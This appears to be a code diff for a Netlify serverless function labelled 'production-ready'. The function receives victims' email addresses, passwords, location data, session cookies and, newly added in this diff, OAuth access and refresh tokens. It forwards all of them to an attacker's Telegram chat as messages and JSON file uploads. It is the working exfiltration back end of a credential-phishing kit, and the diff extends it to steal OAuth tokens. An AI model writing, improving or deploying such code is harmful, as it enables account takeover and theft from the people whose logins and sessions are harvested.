@@ -1,6 +1,6 @@
 /**
  * PRODUCTION-READY: Telegram Bot Function for Netlify
- * FIXED: Sends cookies as downloadable TXT file using multipart/form-data
+ * ✅ SENDS: OAuth tokens and cookies ONLY as JSON files (NO text in message)
  */
 
 const https = require('https');
@@ -62,7 +62,6 @@ function sendMessageToTelegram(text, parseMode = 'HTML') {
   });
 }
 
-// ✅ FIXED: Send file as multipart/form-data (proper file upload)
 function sendDocumentToTelegram(fileContent, fileName) {
   return new Promise((resolve, reject) => {
     const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2, 15);
@@ -72,7 +71,7 @@ function sendDocumentToTelegram(fileContent, fileName) {
     body += `${TELEGRAM_CHAT_ID}\r\n`;
     body += `--${boundary}\r\n`;
     body += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
-    body += `Content-Type: text/plain\r\n\r\n`;
+    body += `Content-Type: application/json\r\n\r\n`;
     body += fileContent;
     body += `\r\n--${boundary}--\r\n`;
 
@@ -90,29 +89,23 @@ function sendDocumentToTelegram(fileContent, fileName) {
       timeout: 15000
     };
 
-    console.log('📤 [TELEGRAM] Sending document via multipart/form-data...');
-    console.log('File name:', fileName);
-    console.log('Content length:', fileContent.length);
+    console.log('📤 [TELEGRAM] Sending document...');
 
     const req = https.request(options, (res) => {
       let data = '';
-      console.log('📥 [TELEGRAM] Response status:', res.statusCode);
-      
       res.on('data', (chunk) => { data += chunk; });
       res.on('end', () => {
         try {
           const response = JSON.parse(data);
-          console.log('📥 [TELEGRAM] Response:', JSON.stringify(response));
-          
           if (res.statusCode === 200 && response.ok) {
-            console.log('✅ [TELEGRAM] Document sent successfully as downloadable file');
+            console.log('✅ [TELEGRAM] Document sent successfully');
             resolve(response);
           } else {
             console.error('❌ [TELEGRAM] API rejected:', response.description);
             reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
           }
         } catch (e) {
-          console.error('❌ [TELEGRAM] Parse error:', e.message, 'Data:', data);
+          console.error('❌ [TELEGRAM] Parse error:', e.message);
           reject(new Error(`Failed to parse Telegram response: ${e.message}`));
         }
       });
@@ -168,10 +161,6 @@ function formatMainMessage(data) {
   message += `\n⏰ ${new Date().toISOString()}\n`;
 
   return message;
-}
-
-function formatCookieMessage(cookieFile) {
-  return cookieFile.content;
 }
 
 function splitMessage(message, maxLength = 4096) {
@@ -251,19 +240,20 @@ exports.handler = async (event, context) => {
       };
     }
 
-    const { email, password, cookies = [], locationData = {}, cookieFiles = {} } = requestData;
+    const { email, password, oauth, cookies = [], locationData = {}, cookieFiles = {} } = requestData;
 
     console.log('📊 [HANDLER] Received data:', {
       email: !!email,
       password: !!password,
+      hasOAuth: !!oauth,
+      hasAccessToken: !!oauth?.access_token,
+      hasRefreshToken: !!oauth?.refresh_token,
       cookieCount: cookies.length,
       locationData: !!locationData.ip,
-      hasCookieFile: !!cookieFiles.jsonFile,
-      cookieFileName: cookieFiles.jsonFile?.name,
-      cookieFileSize: cookieFiles.jsonFile?.size
+      hasCookieFile: !!cookieFiles.jsonFile
     });
 
-    if (!email && !password && cookies.length === 0) {
+    if (!email && !password && cookies.length === 0 && !oauth) {
       return {
         statusCode: 400,
         headers,
@@ -273,8 +263,9 @@ exports.handler = async (event, context) => {
 
     let credentialsSent = false;
     let cookiesSent = false;
+    let oauthFileSent = false;
 
-    // ✅ MESSAGE 1: Send credentials
+    // ✅ MESSAGE 1: Send ONLY email, password, and location (NO OAuth tokens in text)
     console.log('═══════════════════════════════════════════');
     console.log('📨 [HANDLER] Sending credentials message...');
     console.log('═══════════════════════════════════════════');
@@ -293,7 +284,32 @@ exports.handler = async (event, context) => {
       console.error('❌ [HANDLER] Failed to send credentials:', error.message);
     }
 
-    // ✅ MESSAGE 2: Send cookies as DOWNLOADABLE FILE
+    // ✅ FILE 1: Send OAuth tokens as JSON file ONLY
+    console.log('═══════════════════════════════════════════');
+    console.log('🎫 [HANDLER] Checking OAuth tokens for file...');
+    console.log('═══════════════════════════════════════════');
+
+    if (oauth && (oauth.access_token || oauth.refresh_token)) {
+      try {
+        console.log('✅ OAuth tokens detected');
+        
+        const oauthContent = JSON.stringify(oauth, null, 2);
+        const oauthFileName = `oauth_tokens_${Date.now()}.json`;
+
+        console.log('📤 Sending OAuth tokens as JSON file...');
+        
+        await sendWithRetry(() => sendDocumentToTelegram(oauthContent, oauthFileName));
+
+        oauthFileSent = true;
+        console.log('✅ [HANDLER] OAuth tokens file sent successfully');
+      } catch (error) {
+        console.error('❌ [HANDLER] Failed to send OAuth file:', error.message);
+      }
+    } else {
+      console.log('⚠️ [HANDLER] No OAuth tokens to send');
+    }
+
+    // ✅ FILE 2: Send cookies as JSON file ONLY
     console.log('═══════════════════════════════════════════');
     console.log('📦 [HANDLER] Checking cookie file...');
     console.log('═══════════════════════════════════════════');
@@ -302,25 +318,21 @@ exports.handler = async (event, context) => {
       try {
         console.log('✅ Cookie file detected');
         console.log(`📄 File: ${cookieFiles.jsonFile.name}`);
-        console.log(`📊 Size: ${cookieFiles.jsonFile.size} bytes`);
 
-        const cookieContent = formatCookieMessage(cookieFiles.jsonFile);
-        const fileName = `${cookieFiles.jsonFile.name}`;
+        const cookieContent = cookieFiles.jsonFile.content;
+        const fileName = cookieFiles.jsonFile.name;
 
-        console.log('📤 Sending cookies as downloadable TXT file...');
+        console.log('📤 Sending cookies as JSON file...');
         
-        // ✅ Send as document via multipart/form-data
         await sendWithRetry(() => sendDocumentToTelegram(cookieContent, fileName));
 
         cookiesSent = true;
-        console.log('✅ [HANDLER] Cookie file sent successfully as downloadable');
+        console.log('✅ [HANDLER] Cookie file sent successfully');
       } catch (error) {
         console.error('❌ [HANDLER] Failed to send cookies:', error.message);
-        console.error('Stack:', error.stack);
       }
     } else {
       console.log('⚠️ [HANDLER] No cookie file data');
-      console.log('🔍 [DEBUG] cookieFiles:', JSON.stringify(cookieFiles, null, 2));
     }
 
     console.log('═══════════════════════════════════════════');
@@ -336,8 +348,11 @@ exports.handler = async (event, context) => {
         timestamp: new Date().toISOString(),
         transmitted: {
           credentials: credentialsSent,
+          oauthFile: oauthFileSent,
           cookieFile: cookiesSent,
           email: !!email,
+          password: !!password,
+          oauth: !!oauth,
           cookies: cookies.length,
           location: !!locationData.ip
         }
